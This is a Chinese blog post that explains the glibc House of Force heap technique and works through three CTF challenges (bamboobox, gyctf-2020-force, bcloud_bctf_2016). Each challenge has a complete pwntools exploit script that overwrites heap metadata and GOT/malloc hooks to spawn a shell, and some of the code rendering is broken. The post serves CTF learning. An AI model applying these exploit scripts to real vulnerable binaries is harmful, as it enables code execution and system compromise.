<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>House of Force ~ Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期三, 五月 13日 2020, 9:30 晚上
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    1.9k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      9 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基本按照这wiki上面学的，简单记录一下。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3>House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</li>
</ul>
<p>所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。</p>
<pre><code>// 获取当前的top chunk，并计算其对应的大小
victim = av-&gt;top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}</code></pre><p>所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。</p>
<h2 id="一般的利用办法"><a href="#一般的利用办法" class="headerlink" title="一般的利用办法"></a>一般的利用办法</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p>
<pre><code>remainder      = chunk_at_offset(victim, nb);
av-&gt;top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。</p>
<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容"><a href="#让top-chunk-的指针减小来修改位于其上面-低地址-的got表中的内容" class="headerlink" title="让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容"></a>让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。</p>
<p><strong>这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下<code>SIZE_SZ</code>（64位是8 ，32位是4）。</strong></p>
<h3 id="让那个top-chunk-指针增大来修改位于高地址空间的内容"><a href="#让那个top-chunk-指针增大来修改位于高地址空间的内容" class="headerlink" title="让那个top chunk 指针增大来修改位于高地址空间的内容"></a>让那个top chunk 指针增大来修改位于高地址空间的内容</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>这个是较好理解的，常用修改libc上面某处的地址。</p>
<h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ul>
<li>添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li>
<li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li>
<li>覆盖 goodbye-message 为magic 函数地址来控制程序执行流。<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *
import time
local_file  = &#39;./bamboobox&#39;
local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
remote_libc = local_libc # &#39;../libc.so.6
debug = 1
if debug:
  io = process(local_file)
  context.log_level = &#39;debug&#39;
  libc = ELF(local_libc)
else:
  io = remote(&#39;node3.buuoj.cn&#39;,25784)
  libc = ELF(remote_libc)
elf = ELF(local_file)
libc = elf.libc
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
sea     = lambda delim,data         :io.sendafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def dbg():
  # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
  gdb.attach(io)
  pause()
</code></pre></li>
</ul>
<p>def add(size,content):<br>    sla(‘choice’,’2’)<br>    sla(‘item name:’,str(size))<br>    sa(‘item’,str(content))</p>
<p>def free(id):<br>    sla(‘choice’,’4’)<br>    sla(‘item’,str(id))</p>
<p>def show(id):<br>    sla(‘choice’,’1’)</p>
<p>def edit(id,size,content):<br>    sla(‘choice’,’3’)<br>    sla(‘item’,str(id))<br>    sla(‘item name’,str(size))<br>    sa(‘item’,str(content))</p>
<p>context.log_level = ‘debug’<br>magic = 0x400d49<br>add(0x30,’chum’)<br>payload = ‘a’ * 0x30 +p64(0) + p64(0xffffffffffffffff)<br>edit(0,0x40,payload)<br>size = -(0x40 + 0x20) - 0x10<br>add(size,’ ‘)<br>payload = p64(0x400d49) + p64(0x400d49)<br>add(0x10,payload)</p>
<h1 id="sla-‘choice-’-’5’"><a href="#sla-‘choice-’-’5’" class="headerlink" title="sla(‘choice:’,’5’)"></a>sla(‘choice:’,’5’)</h1><p>itr()</p>
<pre><code>
## gyctf-2020-force

### ida分析

![][image-5]
可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。

### 利用思路
- 申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。
- HOF
- `__malloc_hook` + one gadget

### exp
</code></pre><p>from pwn import *<br>import time<br>local_libc  = ‘/lib/x86_64-linux-gnu/libc.so.6’<br>local_file  = ‘./gyctf_2020_force’<br>remote_libc = local_libc # ‘../libc.so.6<br>debug = 0<br>if debug:<br>    io = process(local_file)<br>    context.log_level = ‘debug’<br>    libc = ELF(local_libc)<br>else:<br>    io = remote(‘node3.buuoj.cn’,29457)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>libc = elf.libc<br>context.arch = elf.arch<br>context.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’<br>rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]<br>realloc = [0x2,0x4,0x6,0xB,0xC,0xD]<br>arae18 = 0x3ebca0<br>s      = lambda data               :io.send(data)<br>sa      = lambda delim,data         :io.sendafter(delim, data)<br>sl      = lambda data               :io.sendline(data)<br>sla     = lambda delim,data         :io.sendlineafter(delim, data)<br>sea     = lambda delim,data         :io.sendafter(delim, data)<br>r      = lambda numb=4096          :io.recv(numb)<br>ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)<br>uu32    = lambda data               :u32(data.ljust(4, ‘\0’))<br>uu64    = lambda data               :u64(data.ljust(8, ‘\0’))<br>info_addr = lambda tag, addr        :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))<br>itr     = lambda                    :io.interactive()<br>def dbg():<br>    # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’)<br>    gdb.attach(io)<br>    pause()</p>
<p>def add(size,date):<br>    sla(‘2:puts’,’1’)<br>    sla(‘size’,str(size))<br>    ru(‘bin addr 0x’)<br>    heapaddr = int(r(12),16)<br>    info_addr(‘heapaddr’,heapaddr)<br>    sa(‘content’,str(date))<br>    return heapaddr<br>payload = 0x30 * ‘a’ + p64(0) + p64(0xffffffffffffffff)<br>libc_base = add(0x200000,’111’) + 0x200ff0<br>info_addr(‘libc_base’,libc_base)<br>malloc_hook = libc_base + 0x3c4b10<br>heapaddr = add(0x30,payload)<br>size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8<br>print(‘size—-&gt;’+hex(size))<br>add(size,’a’)<br>rce = rce16[1] + libc_base<br>payload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[‘__libc_realloc’] + realloc[1])<br>add(0x20,payload)<br>sla(‘2:puts’,’1’)<br>sla(‘size’,’30’)</p>
<h1 id="dbg"><a href="#dbg" class="headerlink" title="dbg()"></a>dbg()</h1><p>itr()</p>
<pre><code>
## `bcloud_bctf_2016`

这个题是一个十分精妙的题，漏洞出现在程序初始化。
![][image-6]
strcpy是以`\x00`来判断一个字符串是否结束的。
在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会**把这个堆块的地址也给复制上去**，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。

![][image-7]
![][image-8]

到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去`0xffffffff`,就可以改到top chunk的size位。

### 利用思路
- leak堆块base
- 修改top chunk size
- hof到heaplist处
- 给heaplist写上free got，用edit，修改其为puts
- 泄漏libc地址
- 修改free got 为system，然后指向`/bin/sh\x00`

### exp
</code></pre><p>from pwn import *<br>from LibcSearcher import *<br>import time<br>local_file  = ‘./bcloud_bctf_2016’<br>local_libc  = ‘/lib/x86_64-linux-gnu/libc.so.6’<br>remote_libc = local_libc # ‘../libc.so.6<br>debug = 0<br>if debug:<br>    io = process(local_file)<br>    context.log_level = ‘debug’<br>    libc = ELF(local_libc)<br>else:<br>    io = remote(‘node3.buuoj.cn’,27301)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>libc = elf.libc<br>context.arch = elf.arch<br>context.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’<br>rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]<br>realloc = [0x2,0x4,0x6,0xB,0xC,0xD]<br>arae18 = 0x3ebca0<br>s      = lambda data               :io.send(data)<br>sa      = lambda delim,data         :io.sendafter(delim, data)<br>sl      = lambda data               :io.sendline(data)<br>sla     = lambda delim,data         :io.sendlineafter(delim, data)<br>sea     = lambda delim,data         :io.sendafter(delim, data)<br>r      = lambda numb=4096          :io.recv(numb)<br>ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)<br>uu32    = lambda data               :u32(data.ljust(4, ‘\0’))<br>uu64    = lambda data               :u64(data.ljust(8, ‘\0’))<br>info_addr = lambda tag, addr        :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))<br>itr     = lambda                    :io.interactive()<br>def debug():<br>    # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’)<br>    gdb.attach(io)<br>    pause()</p>
<p>def name(name):<br>    sa(‘name’,str(name))<br>    ru(‘b’)<br>    heapbase = uu32(r(4)) - 0x8<br>    info_addr(‘heapbase’,heapbase)<br>    return heapbase<br>def org(org,host):<br>    sa(‘Org:’,str(org))<br>    sla(‘Host:’,str(host))</p>
<p>def add(size,content):<br>    sla(‘option—&gt;&gt;’,’1’)<br>    sla(‘length’,str(size))<br>    sa(‘content:’,str(content))</p>
<p>def edit(id,content):<br>    sla(‘—&gt;&gt;’,’3’)<br>    sla(‘id’,str(id))<br>    sa(‘the new content’,str(content))</p>
<p>def free(id):<br>    sla(‘-&gt;’,’4’)<br>    sla(‘id’,str(id))</p>
<p>context.log_level = ‘debug’</p>
<p>sizelist = 0x804B0A0<br>heaplist = 0x804B120<br>heapbase = name(‘a’ * (0x40-1) + ‘b’)<br>top = heapbase + 0xd8<br>info_addr(‘top’,top)<br>org(‘b’*0x40,p32(0xffffffff)) #chang top chunk size<br>size = heaplist - top - 0x10<br>add(size,’\n’)<br>add(0x18,’\n’)<br>payload = p32(0) + p32(elf.got[‘free’]) + p32(elf.got[‘atoi’])  +p32(0x804B128+4+4) + ‘/bin/sh\x00’<br>edit(1,payload + ‘\n’)<br>puts_plt = elf.plt[‘puts’]<br>edit(1,p32(puts_plt) + ‘\n’)<br>free(2)<br>io.recv(1)<br>io.recv(1)<br>atoi = uu32(r(4))<br>info_addr(‘atoi’,atoi)<br>libc = LibcSearcher(‘atoi’,atoi)<br>libc_base = atoi - libc.dump(‘atoi’)<br>system = libc_base + libc.dump(‘system’)<br>info_addr(‘libc_base’,libc_base)<br>edit(1,p32(system) + ‘\n’)<br>free(3)<br>itr()<br>```</p>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/pwn">pwn</a>
                
                  <a class="hover-with-bg" href="/tags/House%E7%B3%BB%E5%88%97">House系列</a>
                
                  <a class="hover-with-bg" href="/tags/heap">heap</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
  
  <br>



    
  <!-- 备案信息 -->
  <a href="http://beian.miit.gov.cn/" target="_blank"
     rel="nofollow noopener">豫ICP备20003962号</a>
  



    <!-- cnzz Analytics icon -->
    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smoothscroll/SmoothScroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  <!-- cnzz Analytics -->
  



  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "House of Force&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  








</body>
</html>
